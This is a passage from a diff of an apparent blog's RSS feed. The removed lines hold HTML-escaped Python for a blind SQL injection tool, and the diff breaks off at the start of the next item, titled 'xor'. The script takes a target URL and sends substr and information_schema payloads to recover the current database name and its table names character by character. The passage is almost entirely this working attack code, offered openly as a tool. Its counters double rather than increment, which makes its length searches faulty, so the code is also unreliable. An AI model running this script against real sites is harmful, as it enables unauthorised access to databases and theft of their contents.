-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payloads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;databs_request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and  (substr(database(),&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{i}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{j}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;databs_request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;databs_request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;databs_request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;reques&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and (select count(table_name) from information_schema.tables where table_schema = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{database_name}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;) = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{lens}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; \
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;reques&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reques&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;下有&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;个表&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;lists&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;table_len&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;tables_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and (length((select table_name from information_schema.tables where table_schema = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{database_name}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; limit &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{i}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1)) = &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{table_len}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; \
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;tables_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tables_len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;lists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;list_s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payloads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;tables_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and (substr((select table_name from information_schema.tables where table_schema = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{database_name}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; limit &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{i}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1),&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{s}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1) = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{j}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; \
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;c1&#34;&gt;# print(tables_name)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;tables_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tables_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;n&#34;&gt;list_s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;---&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list_s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+]注入点(http://xxxx/?id=1&amp;#39;):&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[+]当前数据库:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;databa_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;</description>
-        </item>
-        <item>
         <title>xor</title>
         <link>http://main1o.github.io/p/xor/</link>
         <pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate>
         
